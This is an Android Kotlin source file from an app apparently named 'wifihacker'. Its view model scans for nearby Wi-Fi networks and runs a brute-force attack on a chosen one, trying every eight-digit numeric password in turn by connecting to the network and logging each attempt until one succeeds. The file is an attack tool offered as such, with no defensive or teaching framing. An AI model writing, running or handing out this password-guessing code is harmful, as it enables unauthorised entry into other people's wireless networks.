package com.hereliesaz.wifihacker

import android.Manifest
import android.app.Application
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.os.Build
import androidx.core.content.ContextCompat
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlin.coroutines.resume

class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val wifiManager =
        application.getSystemService(Context.WIFI_SERVICE) as WifiManager
    private val connectivityManager =
        application.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager

    private val _scanResults = MutableStateFlow<List<ScanResult>>(emptyList())
    val scanResults: StateFlow<List<ScanResult>> = _scanResults

    private val _isScanning = MutableStateFlow(false)
    val isScanning: StateFlow<Boolean> = _isScanning

    private val _scanThrottled = MutableStateFlow(false)
    val scanThrottled: StateFlow<Boolean> = _scanThrottled

    private val _selectedNetwork = MutableStateFlow<ScanResult?>(null)
    val selectedNetwork: StateFlow<ScanResult?> = _selectedNetwork

    private val _logMessages = MutableStateFlow<List<String>>(emptyList())
    val logMessages: StateFlow<List<String>> = _logMessages

    private val _isAttacking = MutableStateFlow(false)
    val isAttacking: StateFlow<Boolean> = _isAttacking

    private val _passwordsTried = MutableStateFlow(0L)
    val passwordsTried: StateFlow<Long> = _passwordsTried

    private val _currentPassword = MutableStateFlow("")
    val currentPassword: StateFlow<String> = _currentPassword

    private val _averageTimePerPassword = MutableStateFlow(0.0)
    val averageTimePerPassword: StateFlow<Double> = _averageTimePerPassword

    private val _totalPasswords = MutableStateFlow(100000000L)
    val totalPasswords: StateFlow<Long> = _totalPasswords

    @Suppress("DEPRECATION")
    private val wifiScanReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val success = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                intent.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false)
            } else {
                intent.getBooleanExtra("newResults", false)
            }
            if (success) {
                if (ContextCompat.checkSelfPermission(
                        context,
                        Manifest.permission.ACCESS_FINE_LOCATION
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    _scanResults.value = wifiManager.scanResults
                }
            }
            _isScanning.value = false
        }
    }

    @Suppress("DEPRECATION")
    fun startScan() {
        _isScanning.value = true
        _scanThrottled.value = false
        val success = wifiManager.startScan()
        if (!success) {
            _scanThrottled.value = true
            _isScanning.value = false
        }
    }

    fun selectNetwork(network: ScanResult) {
        _selectedNetwork.value = network
    }

    fun startAttack() {
        if (_isAttacking.value) return

        viewModelScope.launch {
            _isAttacking.value = true
            _logMessages.value = listOf("Starting attack on ${_selectedNetwork.value?.SSID}...")

            withContext(Dispatchers.IO) {
                for (i in 0 until totalPasswords.value) {
                    if (!_isAttacking.value) break

                    val password = i.toString().padStart(8, '0')
                    val startTime = System.currentTimeMillis()

                    val success = connectToWifi(password)

                    val endTime = System.currentTimeMillis()
                    val timeTaken = endTime - startTime

                    withContext(Dispatchers.Main) {
                        _currentPassword.value = password
                        _passwordsTried.value = i + 1
                        val newAverage =
                            ((_averageTimePerPassword.value * i) + timeTaken) / (i + 1)
                        _averageTimePerPassword.value = newAverage
                        _logMessages.value = _logMessages.value + "Tried: $password - ${if (success) "Success!" else "Failed"}"

                        if (success) {
                            _logMessages.value = _logMessages.value + "Password found: $password"
                            _isAttacking.value = false
                        }
                    }
                }
            }

            if (_isAttacking.value) {
                _logMessages.value = _logMessages.value + "Attack finished. Password not found."
            }
            _isAttacking.value = false
        }
    }

    private suspend fun connectToWifi(password: String): Boolean {
        val selectedSsid = _selectedNetwork.value?.SSID ?: return false

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val specifier = android.net.wifi.WifiNetworkSpecifier.Builder()
                .setSsid(selectedSsid)
                .setWpa2Passphrase(password)
                .build()

            val request = android.net.NetworkRequest.Builder()
                .addTransportType(android.net.NetworkCapabilities.TRANSPORT_WIFI)
                .setNetworkSpecifier(specifier)
                .build()

            suspendCancellableCoroutine { continuation ->
                val networkCallback = object : android.net.ConnectivityManager.NetworkCallback() {
                    override fun onAvailable(network: android.net.Network) {
                        super.onAvailable(network)
                        connectivityManager.bindProcessToNetwork(network)
                        if (continuation.isActive) {
                            continuation.resume(true)
                        }
                        connectivityManager.unregisterNetworkCallback(this)
                    }

                    override fun onUnavailable() {
                        super.onUnavailable()
                        if (continuation.isActive) {
                            continuation.resume(false)
                        }
                        connectivityManager.unregisterNetworkCallback(this)
                    }
                }
                connectivityManager.requestNetwork(request, networkCallback)
            }
        } else {
            @Suppress("DEPRECATION")
            val wifiConfig = android.net.wifi.WifiConfiguration()
            wifiConfig.SSID = "\"$selectedSsid\""
            wifiConfig.preSharedKey = "\"$password\""
            val netId = wifiManager.addNetwork(wifiConfig)
            wifiManager.disconnect()
            wifiManager.enableNetwork(netId, true)
            wifiManager.reconnect()
            // This is not a reliable way to check for success on older versions,
            // but it's the best we can do with the deprecated API.
            kotlinx.coroutines.delay(5000) // Wait for connection
            wifiManager.connectionInfo.networkId == netId
        }
    }

    init {
        val intentFilter = IntentFilter()
        intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        getApplication<Application>().registerReceiver(wifiScanReceiver, intentFilter)
    }

    override fun onCleared() {
        super.onCleared()
        getApplication<Application>().unregisterReceiver(wifiScanReceiver)
    }
}
